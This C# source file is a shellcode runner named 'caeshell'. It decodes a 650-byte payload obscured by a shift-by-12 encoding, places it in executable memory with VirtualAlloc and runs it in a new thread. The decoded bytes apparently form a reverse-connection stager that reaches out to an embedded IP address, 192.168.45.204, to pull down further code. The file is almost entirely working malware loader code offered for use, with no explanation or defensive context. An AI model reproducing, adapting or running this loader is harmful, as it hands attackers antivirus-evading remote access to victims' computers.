using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace caeshell
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        static void Main(string[] args)
        {
            byte[] buf = new byte[650] {
            0x08, 0x54, 0x8f, 0xf0, 0xfc, 0xf4, 0xd8, 0x0c, 0x0c, 0x0c, 0x4d, 0x5d, 0x4d, 0x5c, 0x5e, 0x54,
            0x3d, 0xde, 0x71, 0x54, 0x97, 0x5e, 0x6c, 0x5d, 0x54, 0x97, 0x5e, 0x24, 0x62, 0x54, 0x97, 0x5e,
            0x2c, 0x54, 0x97, 0x7e, 0x5c, 0x59, 0x3d, 0xd5, 0x54, 0x1b, 0xc3, 0x56, 0x56, 0x54, 0x3d, 0xcc,
            0xb8, 0x48, 0x6d, 0x88, 0x0e, 0x38, 0x2c, 0x4d, 0xcd, 0xd5, 0x19, 0x4d, 0x0d, 0xcd, 0xee, 0xf9,
            0x5e, 0x4d, 0x5d, 0x54, 0x97, 0x5e, 0x2c, 0x97, 0x4e, 0x48, 0x54, 0x0d, 0xdc, 0x72, 0x8d, 0x84,
            0x24, 0x17, 0x0e, 0x1b, 0x91, 0x7e, 0x0c, 0x0c, 0x0c, 0x97, 0x8c, 0x94, 0x0c, 0x0c, 0x0c, 0x54,
            0x91, 0xcc, 0x80, 0x73, 0x54, 0x0d, 0xdc, 0x5c, 0x97, 0x54, 0x24, 0x50, 0x97, 0x4c, 0x2c, 0x55,
            0x0d, 0xdc, 0xef, 0x62, 0x54, 0x0b, 0xd5, 0x4d, 0x97, 0x40, 0x94, 0x59, 0x3d, 0xd5, 0x54, 0x0d,
            0xe2, 0x54, 0x3d, 0xcc, 0x4d, 0xcd, 0xd5, 0x19, 0xb8, 0x4d, 0x0d, 0xcd, 0x44, 0xec, 0x81, 0xfd,
            0x58, 0x0f, 0x58, 0x30, 0x14, 0x51, 0x45, 0xdd, 0x81, 0xe4, 0x64, 0x50, 0x97, 0x4c, 0x30, 0x55,
            0x0d, 0xdc, 0x72, 0x4d, 0x97, 0x18, 0x54, 0x50, 0x97, 0x4c, 0x28, 0x55, 0x0d, 0xdc, 0x4d, 0x97,
            0x10, 0x94, 0x54, 0x0d, 0xdc, 0x4d, 0x64, 0x4d, 0x64, 0x6a, 0x65, 0x66, 0x4d, 0x64, 0x4d, 0x65,
            0x4d, 0x66, 0x54, 0x8f, 0xf8, 0x2c, 0x4d, 0x5e, 0x0b, 0xec, 0x64, 0x4d, 0x65, 0x66, 0x54, 0x97,
            0x1e, 0xf5, 0x57, 0x0b, 0x0b, 0x0b, 0x69, 0x54, 0x3d, 0xe7, 0x5f, 0x55, 0xca, 0x83, 0x75, 0x7a,
            0x75, 0x7a, 0x71, 0x80, 0x0c, 0x4d, 0x62, 0x54, 0x95, 0xed, 0x55, 0xd3, 0xce, 0x58, 0x83, 0x32,
            0x13, 0x0b, 0xe1, 0x5f, 0x5f, 0x54, 0x95, 0xed, 0x5f, 0x66, 0x59, 0x3d, 0xcc, 0x59, 0x3d, 0xd5,
            0x5f, 0x5f, 0x55, 0xc6, 0x46, 0x62, 0x85, 0xb3, 0x0c, 0x0c, 0x0c, 0x0c, 0x0b, 0xe1, 0xf4, 0x1b,
            0x0c, 0x0c, 0x0c, 0x3d, 0x45, 0x3e, 0x3a, 0x3d, 0x42, 0x44, 0x3a, 0x40, 0x41, 0x3a, 0x3e, 0x3c,
            0x40, 0x0c, 0x66, 0x54, 0x95, 0xcd, 0x55, 0xd3, 0xcc, 0xc7, 0x0d, 0x0c, 0x0c, 0x59, 0x3d, 0xd5,
            0x5f, 0x5f, 0x76, 0x0f, 0x5f, 0x55, 0xc6, 0x63, 0x95, 0xab, 0xd2, 0x0c, 0x0c, 0x0c, 0x0c, 0x0b,
            0xe1, 0xf4, 0x6c, 0x0c, 0x0c, 0x0c, 0x3b, 0x3f, 0x44, 0x77, 0x6d, 0x4e, 0x6e, 0x41, 0x3f, 0x65,
            0x5b, 0x86, 0x5f, 0x7f, 0x80, 0x5b, 0x83, 0x81, 0x7d, 0x42, 0x6b, 0x65, 0x73, 0x86, 0x72, 0x41,
            0x76, 0x3c, 0x57, 0x65, 0x5c, 0x45, 0x43, 0x58, 0x52, 0x73, 0x82, 0x82, 0x77, 0x86, 0x5b, 0x53,
            0x4f, 0x61, 0x5a, 0x84, 0x64, 0x82, 0x4e, 0x43, 0x5b, 0x6e, 0x54, 0x5b, 0x7f, 0x58, 0x71, 0x75,
            0x6e, 0x5d, 0x7f, 0x7c, 0x6f, 0x70, 0x70, 0x50, 0x54, 0x86, 0x39, 0x74, 0x63, 0x4f, 0x62, 0x76,
            0x41, 0x3c, 0x84, 0x81, 0x7a, 0x50, 0x45, 0x7b, 0x63, 0x4f, 0x66, 0x6e, 0x77, 0x51, 0x63, 0x72,
            0x77, 0x52, 0x7c, 0x44, 0x5d, 0x0c, 0x54, 0x95, 0xcd, 0x5f, 0x66, 0x4d, 0x64, 0x59, 0x3d, 0xd5,
            0x5f, 0x54, 0xc4, 0x0c, 0x3e, 0xb4, 0x90, 0x0c, 0x0c, 0x0c, 0x0c, 0x5c, 0x5f, 0x5f, 0x55, 0xd3,
            0xce, 0xf7, 0x61, 0x3a, 0x47, 0x0b, 0xe1, 0x54, 0x95, 0xd2, 0x76, 0x16, 0x6b, 0x54, 0x95, 0xfd,
            0x76, 0x2b, 0x66, 0x5e, 0x74, 0x8c, 0x3f, 0x0c, 0x0c, 0x55, 0x95, 0xec, 0x76, 0x10, 0x4d, 0x65,
            0x55, 0xc6, 0x81, 0x52, 0xaa, 0x92, 0x0c, 0x0c, 0x0c, 0x0c, 0x0b, 0xe1, 0x59, 0x3d, 0xcc, 0x5f,
            0x66, 0x54, 0x95, 0xfd, 0x59, 0x3d, 0xd5, 0x59, 0x3d, 0xd5, 0x5f, 0x5f, 0x55, 0xd3, 0xce, 0x39,
            0x12, 0x24, 0x87, 0x0b, 0xe1, 0x91, 0xcc, 0x81, 0x2b, 0x54, 0xd3, 0xcd, 0x94, 0x1f, 0x0c, 0x0c,
            0x55, 0xc6, 0x50, 0xfc, 0x41, 0xec, 0x0c, 0x0c, 0x0c, 0x0c, 0x0b, 0xe1, 0x54, 0x0b, 0xdb, 0x80,
            0x0e, 0xf7, 0xb6, 0xf4, 0x61, 0x0c, 0x0c, 0x0c, 0x5f, 0x65, 0x76, 0x4c, 0x66, 0x55, 0x95, 0xdd,
            0xcd, 0xee, 0x1c, 0x55, 0xd3, 0xcc, 0x0c, 0x1c, 0x0c, 0x0c, 0x55, 0xc6, 0x64, 0xb0, 0x5f, 0xf1,
            0x0c, 0x0c, 0x0c, 0x0c, 0x0b, 0xe1, 0x54, 0x9f, 0x5f, 0x5f, 0x54, 0x95, 0xf3, 0x54, 0x95, 0xfd,
            0x54, 0x95, 0xe6, 0x55, 0xd3, 0xcc, 0x0c, 0x2c, 0x0c, 0x0c, 0x55, 0x95, 0x05, 0x55, 0xc6, 0x1e,
            0xa2, 0x95, 0xee, 0x0c, 0x0c, 0x0c, 0x0c, 0x0b, 0xe1, 0x54, 0x8f, 0xd0, 0x2c, 0x91, 0xcc, 0x80,
            0xbe, 0x72, 0x97, 0x13, 0x54, 0x0d, 0xcf, 0x91, 0xcc, 0x81, 0xde, 0x64, 0xcf, 0x64, 0x76, 0x0c,
            0x65, 0x55, 0xd3, 0xce, 0xfc, 0xc1, 0xae, 0x62, 0x0b, 0xe1};

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 12) & 0xFF);
            }
            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
